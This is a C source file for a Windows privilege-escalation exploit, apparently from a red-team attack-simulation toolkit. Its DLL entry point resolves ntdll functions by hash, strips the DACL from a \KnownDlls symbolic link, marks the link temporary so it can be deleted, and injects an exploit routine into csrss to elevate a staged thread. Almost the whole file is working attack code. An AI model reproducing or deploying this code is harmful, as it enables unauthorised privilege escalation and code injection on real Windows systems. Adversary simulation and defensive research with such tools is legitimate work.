/*!
 *
 * Exploit
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack Simulation
 *
!*/

#include "Common.h"

typedef struct
{
	D_API( RtlSetDaclSecurityDescriptor );
	D_API( RtlCreateSecurityDescriptor );
	D_API( NtOpenSymbolicLinkObject );
	D_API( NtWaitForSingleObject );
	D_API( NtMakeTemporaryObject );
	D_API( RtlInitUnicodeString );
	D_API( NtFreeVirtualMemory );
	D_API( NtSetSecurityObject );
	D_API( NtOpenEvent );
	D_API( NtSetEvent );
	D_API( NtClose );
} API ;

#define H_API_RTLSETDACLSECURITYDESCRIPTOR	0x208226ee /* RtlSetDaclSecurityDescriptor */
#define H_API_RTLCREATESECURITYDESCRIPTOR	0xc534aac2 /* RtlCreateSecurityDescriptor */
#define H_API_NTOPENSYMBOLICLINKOBJECT		0x227590a0 /* NtOpenSymbolicLinkObject */	
#define H_API_NTWAITFORSINGLEOBJECT		0xe8ac0c3c /* NtWaitForSingleObject */
#define H_API_NTMAKETEMPORARYOBJECT		0xeeeeac7f /* NtMakeTemporaryObject */
#define H_API_RTLINITUNICODESTRING		0xef52b589 /* RtlInitUnicodeString */
#define H_API_NTFREEVIRTUALMEMORY		0x2802c609 /* NtFreeVirtualMemory */
#define H_API_NTSETSECURITYOBJECT		0xea44e102 /* NtSetSecurityObject */
#define H_API_NTOPENEVENT			0x228fba7b /* NtOpenEvent */
#define H_API_NTSETEVENT			0xcb87d8b5 /* NtSetEvent */
#define H_API_NTCLOSE				0x40d6e69d /* NtClose */
#define H_LIB_NTDLL				0x1edab0ed /* ntdll.dll */

/*!
 *
 * Purpose:
 *
 * If attached within the context of CSR, it will
 * exploit the vulnerability and elevate the
 * stage0 thread.
 *
 * If not, it will inject itself into CSR to run
 * the exploit.
 *
!*/

D_SEC( B ) BOOL WINAPI DllMain( _In_ HINSTANCE hInstance, _In_ UINT32 Reason, _In_ PVOID Parameter )
{
	API			Api;
	UNICODE_STRING		Uni;
	OBJECT_ATTRIBUTES	Att;
	SECURITY_DESCRIPTOR	Std;

	SIZE_T			Len = 0;
	LPWSTR			Evs = NULL;
	LPWSTR			Lns = NULL;

	HANDLE			Ln1 = NULL;
	HANDLE			Ln2 = NULL;
	HANDLE			Evt = NULL;
	HANDLE			Thd = NULL;
	PTABLE			Tbl = NULL;

	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Uni, sizeof( Uni ) );
	RtlSecureZeroMemory( &Att, sizeof( Att ) );
	RtlSecureZeroMemory( &Std, sizeof( Std ) );

	switch( Reason ) 
	{
		case 4:
			Evs = StringPrintfAToW( C_PTR( G_PTR( "\\GLOBAL??\\%ls" ) ), C_PTR( G_PTR( EvtSz ) ) );
			Lns = StringPrintfAToW( C_PTR( G_PTR( "\\KnownDlls\\%ls" ) ), C_PTR( G_PTR( LibSz ) ) );

			if ( Evs != NULL ) {
				Api.RtlSetDaclSecurityDescriptor = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLSETDACLSECURITYDESCRIPTOR );
				Api.RtlCreateSecurityDescriptor  = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLCREATESECURITYDESCRIPTOR );
				Api.NtOpenSymbolicLinkObject     = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTOPENSYMBOLICLINKOBJECT );
				Api.NtWaitForSingleObject        = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTWAITFORSINGLEOBJECT );
				Api.NtMakeTemporaryObject        = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTMAKETEMPORARYOBJECT );
				Api.RtlInitUnicodeString         = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLINITUNICODESTRING );
				Api.NtFreeVirtualMemory          = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTFREEVIRTUALMEMORY );
				Api.NtSetSecurityObject          = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTSETSECURITYOBJECT );
				Api.NtOpenEvent                  = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTOPENEVENT );
				Api.NtSetEvent                   = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTSETEVENT );
				Api.NtClose                      = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTCLOSE );

				Api.RtlInitUnicodeString( &Uni, Evs );
				InitializeObjectAttributes( &Att, &Uni, OBJ_CASE_INSENSITIVE, NULL, NULL );

				if ( NT_SUCCESS( Api.NtOpenEvent( &Evt, EVENT_MODIFY_STATE, &Att ) ) ) {
					if ( NT_SUCCESS( Api.NtSetEvent( Evt, NULL ) ) ) {
						Api.RtlInitUnicodeString( &Uni, Lns );
						InitializeObjectAttributes( &Att, &Uni, OBJ_CASE_INSENSITIVE, NULL, NULL );
						if ( NT_SUCCESS( Api.NtOpenSymbolicLinkObject( &Ln1, WRITE_DAC, &Att ) ) ) {
							if ( NT_SUCCESS( Api.RtlCreateSecurityDescriptor( &Std, SECURITY_DESCRIPTOR_REVISION ) ) ) {
								if ( NT_SUCCESS( Api.RtlSetDaclSecurityDescriptor( &Std, TRUE, NULL, FALSE ) ) ) {
									if ( NT_SUCCESS( Api.NtSetSecurityObject( Ln1, DACL_SECURITY_INFORMATION, &Std ) ) ) {
										if ( NT_SUCCESS( Api.NtOpenSymbolicLinkObject( &Ln2, DELETE, &Att ) ) ) {
											if ( NT_SUCCESS( Api.NtMakeTemporaryObject( Ln2 ) ) ) {
												Tbl = C_PTR( G_PTR( Table ) );
												if ( InjectProcess( Tbl->CsrssId, C_PTR( G_PTR( ExploitFunction ) ), U_PTR( G_END() ) - U_PTR( G_PTR( ExploitFunction ) ), &Thd ) ) {
													Api.NtWaitForSingleObject( Thd, FALSE, NULL );
													Api.NtClose( Thd );
												};
											};
											Api.NtClose( Ln2 );
										};
									};
								};
							};
							Api.NtClose( Ln1 );
						};
					};
					Api.NtClose( Evt );
				};
				Api.NtFreeVirtualMemory( NtCurrentProcess(), &Lns, &Len, MEM_RELEASE );
				Api.NtFreeVirtualMemory( NtCurrentProcess(), &Evs, &Len, MEM_RELEASE );
			};
			break;
		case DLL_PROCESS_ATTACH:
			break;
		case DLL_PROCESS_DETACH:
			break;
	};
	return FALSE;
};
